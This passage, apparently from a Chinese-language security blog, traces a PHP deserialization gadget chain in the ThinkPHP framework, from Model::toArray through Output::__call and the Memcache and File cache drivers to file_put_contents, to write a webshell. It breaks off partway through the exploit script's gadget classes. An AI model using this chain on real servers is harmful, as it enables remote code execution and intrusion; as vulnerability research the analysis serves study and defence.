class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里比较长，但是不需要进行特别详细的审计，主要是看看有没有可以利用的危险函数，或者是可以当成跳板的利用点。</p><p>简单看了一下，这里没有什么危险函数，所以要考虑找跳板。</p><p>这里比较常见的跳板主要是<code>__call()</code></p><p>看看有没有可控的，调用了函数的变量。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812143808226.png" alt="image-20220812143808226"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812172140357.png" alt="image-20220812172140357"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812143843351.png" alt="image-20220812143843351"></p><p>可以看到，一共有这三个变量调用了方法，找一下有没有可控的。</p><p><strong>利用PHPSTORM的查找写入值，可以比较方便的看见写入和读取的过程。</strong></p><h3 id="前提"><a href="#前提" class="headerlink" title="前提:"></a>前提:</h3><h4 id="首先看-relation"><a href="#首先看-relation" class="headerlink" title="首先看$relation"></a>首先看<code>$relation</code></h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812145720654.png" alt="image-20220812145720654"></p><p>前两个是用getAttr()函数来返回以$key为键名的数组$data的元素值。</p><p>后一个是调用了Loader类中的方法，看一下方法：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812153658721.png" alt="image-20220812153658721"></p><p>函数备注了字符串命名风格转换，理论上来说对于输入的字符串<code>$name</code>是不会有什么影响的，如果<code>$name</code>可以进行控制的话，那么就可以控制到<code>$relation</code>。</p><p>回头查看一下：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812154015673.png" alt="image-20220812154015673"></p><p>通过查看<code>append</code>的调用，可以发现<code>append</code>是可以控制的，那么<code>$name</code>和<code>$relation</code>就是可以控制的了。可以通过这里触发<code>__call()</code>魔术方法。</p><h4 id="然后是看-modelRelation"><a href="#然后是看-modelRelation" class="headerlink" title="然后是看$modelRelation"></a>然后是看<code>$modelRelation</code></h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812150206858.png" alt="image-20220812150206858"></p><p>这里有一个写入值的地方。</p><p>说实话，这部分我没看懂代码</p><p>查了一下之后， 对于这部分代码可以理解为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>(); <span class="comment">//relation是一个可以改变的函数名，可以根据$relatioin不同值，来使得$modelRelation等于不同函数的返回值。</span></span><br></pre></td></tr></table></figure><p>同时要进入这部分，需要首先满足<code>method_exists()</code>这个方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812163408257.png" alt="image-20220812163408257"></p><p>用于这部分，就是需要满足<code>$relation()</code>所指向的方法，是存在于Model类中的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812163650728.png" alt="image-20220812163650728"></p><p>这里选择的是getError()这个方法，因为返回值是可以控制的。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812163810108.png" alt="image-20220812163810108"></p><p>所以只要通过设置<code>$error</code>为一个对象，同时将<code>$relation</code>设置为getError,就可以实现对<code>$modelRelation</code>的控制，进而触发<code>__call()</code></p><h4 id="最后看一下-value"><a href="#最后看一下-value" class="headerlink" title="最后看一下$value"></a>最后看一下<code>$value</code></h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812164332703.png" alt="image-20220812164332703"></p><p>这里可以看见两个写入值的地方，跟进一下<code>getRelationData($modelRelation)</code></p><p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220813230308173.png" alt="image-20220813230308173"></p><p>这里首先判断了一下传入的参数是Relation类的对象（也就是$modelRelation）</p><p>可以看见下面有一个$value &#x3D; $this-&gt;parent，而<code>$parent</code>是可控的，这里如果能控制就很方便了。</p><p>看看判断条件：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>))</span><br></pre></td></tr></table></figure><p>分析一下：</p><p>这里需要<code>$this-&gt;parent</code>存在，<code>$modelRelation</code>中存在<code>isSelfRelation()</code>且返回值为0，<code>$modelRelation</code>中存在<code>getModel()</code>方法。</p><p>满足以上条件之后，就可以进入if，然后令<code>$value=$this-&gt;partent</code>。所以<code>$value</code>也是可以控制的</p><h3 id="触发-call"><a href="#触发-call" class="headerlink" title="触发__call():"></a>触发__call():</h3><p>接下来就是要考虑怎么调用函数，来触发<code>__call()</code>。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">           <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">               &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                   <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                       <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                       <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                           <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                           <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                               <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                   <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                       <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                   &#125;</span><br><span class="line">                               &#125;</span><br><span class="line">                               <span class="keyword">continue</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="1、if-empty-this-gt-append"><a href="#1、if-empty-this-gt-append" class="headerlink" title="1、if (!empty($this-&gt;append))"></a>1、<code>if (!empty($this-&gt;append))</code></h4><p>可以直接控制，进入</p><h4 id="2、foreach-this-gt-append-as-key-gt-name"><a href="#2、foreach-this-gt-append-as-key-gt-name" class="headerlink" title="2、foreach ($this-&gt;append as $key =&gt; $name)"></a>2、<code>foreach ($this-&gt;append as $key =&gt; $name)</code></h4><p>控制了<code>$append</code>,可以直接进入。</p><h4 id="3、if-is-array-name"><a href="#3、if-is-array-name" class="headerlink" title="3、if (is_array($name))"></a>3、<code>if (is_array($name))</code></h4><p>令上一步中的<code>$name</code>不是数组，进入。</p><h4 id="4、elseif-strpos-name-39-39"><a href="#4、elseif-strpos-name-39-39" class="headerlink" title="4、elseif (strpos($name, &#39;.&#39;))"></a>4、<code>elseif (strpos($name, &#39;.&#39;))</code></h4><p><code>$name</code>不存在<code>.</code>，进入。</p><h4 id="5、if-method-exists-this-relation"><a href="#5、if-method-exists-this-relation" class="headerlink" title="5、if (method_exists($this, $relation))"></a>5、<code>if (method_exists($this, $relation))</code></h4><p>要保证在Model类中，<code>$relation</code>表示的函数存在即可进入。</p><h4 id="6、if-method-exists-modelRelation-39-getBindAttr-39"><a href="#6、if-method-exists-modelRelation-39-getBindAttr-39" class="headerlink" title="6、if (method_exists($modelRelation, &#39;getBindAttr&#39;))"></a>6、<code>if (method_exists($modelRelation, &#39;getBindAttr&#39;))</code></h4><p>保证在<code>$modelRelation</code>表示的类中存在<code>getBindAttr()</code>方法可以进入。</p><h4 id="7、if-bindAttr"><a href="#7、if-bindAttr" class="headerlink" title="7、if ($bindAttr)"></a>7、<code>if ($bindAttr)</code></h4><p>保证<code>$modelRelation-&gt;getBindAttr();</code>存在，可以进入</p><h4 id="8、if-isset-this-gt-data-key"><a href="#8、if-isset-this-gt-data-key" class="headerlink" title="8、if (isset($this-&gt;data[$key])) {"></a>8、<code>if (isset($this-&gt;data[$key])) &#123;</code></h4><p>使得<code>$data</code>中以<code>$key</code>为键的元素是空即可绕过。</p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>对于以上的八个关键点，进行分析：</p><p>因为我们可以控制<code>$append</code>，所以我们可以对<code>$key</code>和<code>$name</code>的值进行控制（通过第二点的foreach）。</p><p>接下来第三点，我们需要保证在<code>$append</code>中元素不为数组，这很好实现，随便写入一个字符串，例如<code>Ho1L0w-By</code>（只是一个例子）即可（但实际上后面的要求不一样，只是就目前情况分析）。</p><p>第四点，要求<code>$name</code>，也就是<code>$append</code>中的元素中不能有<code>.</code>，写的字符串已经实现了。</p><p>第五点和第六点需要一起看，就像是我们之前分析<code>$relation</code>和<code>$modelRelation</code>一样，为了控制第六点中的<code>$modelRelation</code>中存在<code>getBindAttr()</code>方法，我们需要将<code>$relation</code>控制写为<code>getError</code>，这样才能控制<code>$modelRelation</code>的值，使得<code>$modelRelation</code>中存在<code>getBindAttr()</code></p><p>那么总结一下上面的六点：</p><p><code>$append</code>中的<code>$key</code>和<code>$name</code>可以控制，且<code>$name</code>的值必须为<code>getError</code>，然后通过设置<code>$error</code>值，来进一步控制<code>$modelRelation</code>。<br>而根据我们之前对于<code>getRelationData()</code>方法中，<code>$value = $this-&gt;partent</code>的分析，这里来总结一下对于<code>$modelRelation</code>需要的条件</p><blockquote><p>1、是Relation对象</p><p>2、存在isSelfRelation()方法，且返回值存在</p><p>3、存在getModel()方法，且返回值与get_class($this-&gt;parent)相同。（双等号）</p><p>4、存在getBindAttr()</p></blockquote><p>进行用法查找：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815145619220.png" alt="image-20220815145619220"></p><p>可以看见这些里面都存在Relation的类。</p><p>而看过<code>Relation</code>类之后可以发现，在所有的Relation的子类中都存在<code>isSelfRelation()</code>和<code>getModel()</code>。</p><p>这里跟进一下<code>getModel()</code>函数：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815152010343.png" alt="image-20220815152010343"></p><p>查找一下用法，可以知道<code>$query</code>是可控的，这里需要知道哪个类的<code>getModel()</code>方法是可控的，来控制返回值。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815152358075.png" alt="image-20220815152358075"></p><p>可以看见是可控的，选择Query.php。</p><p>接下来就是在这些子类中找存在<code>getBindAttr()</code>方法的类</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815145954924.png" alt="image-20220815145954924"></p><p>在这里可以看见，和上面的重合点有一个，就是OneToOne.php里面。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815150109645.png" alt="image-20220815150109645"></p><p>而这里因为OneToOne这个类是抽象类，所以还需要找到它的子类。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815150422997.png" alt="image-20220815150422997"></p><p>这里可以选择HasOne.php。</p><p>这里就已经解决了<code>$modelRelation</code>的需求，可以继续看剩下的7，8点。</p><p>第七点需要我们返回的<code>$bindAttr</code>的值存在，看一下OneToOne.php中的<code>getBindAttr()</code>方法，可以看见是可控的，简单绕过。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815150950059.png" alt="image-20220815150950059"></p><p>第八点我们对$key的值溯源一下，</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815153550623.png" alt="image-20220815153550623"></p><p>看一下这个三元运算，只要<code>$key</code>是数字，就可以设置<code>$key</code>的值为<code>$attr</code>，可以看见<code>$key</code>和<code>$attr</code>都是我们可以进行控制的，因为<code>$bindAttr</code>可以控制。</p><p>到这里，已经可以执行我们需要的函数来触发<code>__call()</code>了。</p><h3 id="选择-call"><a href="#选择-call" class="headerlink" title="选择__call():"></a>选择__call():</h3><p>进行全局搜索，找到一个合适的__call()方法</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815155824034.png" alt="image-20220815155824034"></p><p>这里根据前人经验，可以选择Output.php（篇幅有限）</p><p> 这里是路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/console/Output.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815163806285.png" alt="image-20220815163806285"></p><p>在这里主要需要看的是这两个函数：</p><p><code>array_unshift()</code>，<code>call_user_func_array()</code>。</p><p><code>array_unshift()</code> 函数用于向数组插入新元素。新数组的值将被插入到数组的开头。</p><p><code>call_user_func_array</code> — 调用回调函数，并把一个数组参数作为回调函数的参数</p><p>可以看到第一个没什么用，但是第二个比较有意思，这里可以调用回调函数。</p><blockquote><p>什么是回调函数？</p><p>通俗的来说，回调函数是一个我们定义的函数，但是不是我们直接来调用，而是通过另一个函数来调用，这个函数通过接收回调函数的名字和参数来实现对它的调用。</p></blockquote><p>看看手册里的说明。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815164709740.png" alt="image-20220815164709740"></p><p>因为是在</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>对__call()进行的触发，所以此处在__call()中的参数，<code>$method</code>是<code>getAttr()</code>，<code>$args</code>是<code>$attr</code>的值。</p><p>第一个if中，可以看见styles是可控的。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815172139229.png" alt="image-20220815172139229"></p><p>将<code>$styles</code>中的值多添加一个<code>getAttr()</code>即可进入</p><p>这里跟进类中的<code>block</code>方法：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815172258334.png" alt="image-20220815172258334"></p><p>跟进<code>writeln</code>(一看就很敏感)</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815172417267.png" alt="image-20220815172417267"></p><p>跟进<code>write</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815173426692.png" alt="image-20220815173426692"></p><p>查看一下<code>$handle</code>的用法</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815174938200.png" alt="image-20220815174938200"></p><p>反序列化是不会调用<code>__construct()</code>的，因此<code>$handle</code>可控</p><p>因此可以全局查看一下哪里的write可以利用：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815175911936.png" alt="image-20220815175911936"></p><p>这里可以看见有好几个write函数存在，也有多个可以利用的点。这里主要让我们看一下<code>Memcache.php</code>中的Write函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/session/driver/Memcache.php</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220815180145913.png" alt="image-20220815180145913"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815181922079.png" alt="image-20220815181922079"></p><p><code>$handler</code>可控，因此可以随便调用任何文件中的set函数，全局查找set函数：</p><p>这里还是使用Seay进行查找。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220820163631897.png" alt="image-20220820163631897"></p><p>这里可以看见很多不同的函数使用文件，可以都看一下，这里如果是想要使用写入webshell，主要的利用点在<code>File.php</code>文件中，文件路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/cache/driver/File.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220820164054864.png" alt="image-20220820164054864"></p><p>可以看见危险函数<code>file_put_contents($filename,$data)</code>，这里可以用来写入webshell。具体内容可以由我们自己决定。</p><p>这里一般来说，只要我们使用一个<code>&lt;?php phpinfo(); ?&gt;</code>，然后访问对应文件，出现了详情页面，就可以用来证明漏洞存在了。</p><p>这里分析一下如何利用到这个<code>file_put_contents()</code>函数。</p><p>第一个if是判断<code>$expire</code>的，对<code>$expire</code>进行了设置。</p><p>第二个if用来判断<code>$expire</code>是不是<code>DataTime</code>的子类，设置时间戳。</p><p>然后将<code>$filename</code>调用<code>getCacheKey()</code>函数进行了值的设置，因为<code>$filename</code>是<code>file_put_contents()</code>函数中的一个参数，所以这里我们跟进函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>); <span class="comment">//$name进行md5加密</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123; </span><br><span class="line">           <span class="comment">// 使用子目录</span></span><br><span class="line">           <span class="variable">$name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">           <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">       <span class="variable">$dir</span>      = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">           <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以看见两个if主要是用来更改文件名的，因为<code>$options</code>可以控制，所以可以直接修改之后绕过。</p><p>然后到了<code>$filename</code>进行设置的地方了，这里同样因为<code>$options</code>可以进行控制，所以基本是可以确定文件名是可控的，同时文件的后缀也是被写死了是.php。</p><p>后面的函数不会影响<code>$filename</code>，因此可以确定<code>$filename</code>可以控制。</p><p>继续分析，可以看见$data作为<code>file_put_contents()</code>函数的参数是进行序列化出来的，参数是使用的<code>$value</code>。</p><p>这里会出现两个问题，因为<code>$value</code>这个值是调用函数时传入的参数，在<code>writeln</code>中一路传过来的时候，已经是被确定了为布尔值的<code>true</code>，因此我们不能对<code>$value</code>达成控制的效果。</p><p>而这里，也可以看见<code>$data</code>的值也是被写死了，并且存在一个<code>exit()</code>函数，需要进行死亡绕过。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>; <span class="comment">//这里连接了一个$data</span></span><br></pre></td></tr></table></figure><p>如果不能解决这两个问题，这条链子是没法调用的。</p><p>这里需要往下看</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220822150924816.png" alt="image-20220822150924816"></p><p>跟进到setTagItem()，</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220822151141432.png" alt="image-20220822151141432"></p><p>可以看见这里将<code>$filename</code>作为参数传递进去，同时在下方继续对set()函数进行了调用，将$key和$value作为参数传递了回去。</p><p>可以看见，在这里的<code>$value</code>是赋值为了<code>$filename</code>的值，因此，如果是构造了较为合理的<code>$filename</code>，那么就可以进行文件的写入。</p><p>写入了文件之后，需要考虑到代码执行的问题，因此需要对exit()函数进行绕过，这里需要用到PHP伪协议的知识，来对exit()函数进行死亡绕过。</p><blockquote><p>死亡绕过参考：<a href="https://xz.aliyun.com/t/8163#toc-0">https://xz.aliyun.com/t/8163#toc-0</a></p></blockquote><p>到这里，这条链子算是走通了。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p>按照我们现在进行的一系列分析，可以尝试写出EXP如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span> <span class="title class_">extends</span> <span class="title class_">Pipes</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Pivot</span></span>) //这里传入的需要是<span class="title">Pivot</span>的实例化对象</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="variable">$Pivot</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Pivot类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$output</span>;  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类，也就是HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//HasOne类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span> <span class="title class_">extends</span> <span class="title class_">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title 